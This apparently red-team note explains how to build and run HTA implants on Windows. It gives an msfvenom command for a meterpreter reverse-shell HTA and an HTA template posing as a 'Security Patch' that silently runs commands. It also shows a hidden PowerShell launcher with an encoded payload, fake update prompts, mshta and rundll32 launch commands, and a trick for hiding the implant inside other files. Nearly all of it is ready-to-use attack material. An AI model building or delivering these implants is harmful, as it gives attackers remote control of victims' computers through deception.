# HTA

## 01 - Generate via `msfvenom`

> [!INFO] Payload's Limitation
> It couldn't handle a command execution that exceeded 8192 characters.. Check for more details about [[Command Prompt|command prompt]] (`cmd.exe`).
 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o implant.hta
```

## 02 - HTA Templates

HTA implant template.

```html
<html>
	<head>
		<title>
			Security Patch
		</title>
	</head>
	<body>
		<p>Installing security patch...</p>
	</body>
	<script language="VBScript">
	Function Execute()
		Set shell = CreateObject("WScript.Shell")
		shell.Run "<commands>", 0
	End Function

	Execute
	</script>
</html>
```

This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[03 - Malware Development/Techniques/Implant Execution/Command Execution/Execute Commands/Windows/WinAPI|section]] related to command execution using `powershell.exe`.

```html
<script language="VBScript">
  window.moveTo -4000, -4000
  Set Shell = CreateObject("WScript.Shell")
  Set Program = CreateObject("Scripting.FileSystemObject")
  For each path in Split(Shell.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If Program.FileExists(path + "\..\powershell.exe") Then
      Shell.Run "powershell -nop -w hidden -e <base64_encoded_powershell_script>", 0
      Exit For
    End If
  Next
  window.close()
</script>
```

## 03 - Execute Implant

### 3.1 - `mshta.exe`

```
C:\> mshta.exe vbscript:Execute("MsgBox(""Would you like to update Windows?"", 64, ""Example"")(window.close)")

C:\> mshta.exe javascript:alert("Please Install Required Update")
```

To execute the implant.

```
C:\> mshta.exe %CD%\implant.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
```

### 3.2 - `rundll32.exe`

```
C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"
```

## 04 - Polyglot

> [!TIP]
> Feel free to experiment around binding any binary file format with `.hta` implant.

Bind the binary files together.

```
C:\> copy /y /b filename.extension+implant.hta hidden_implant.extension
```

It's also possible to do this in `wine`.

```
$ wine cmd.exe /y /c copy /b filename.extension+implant.hta hidden_implant.extension
```

Then execute it

```
C:\> mshta.exe %CD%\hidden_implant.extensions
```

---
## References

### Backlinks

- [[Rundll32]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]

### LOLBAS

- [LOLBAS: Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

### Red Team Notes

- [Red Team Notes: MSHTA](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)

### DMCXBlue

- [DMCXBlue: MSHTA](https://dmcxblue.gitbook.io/red-team-notes/execution/mshta)

### Sevagas

- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)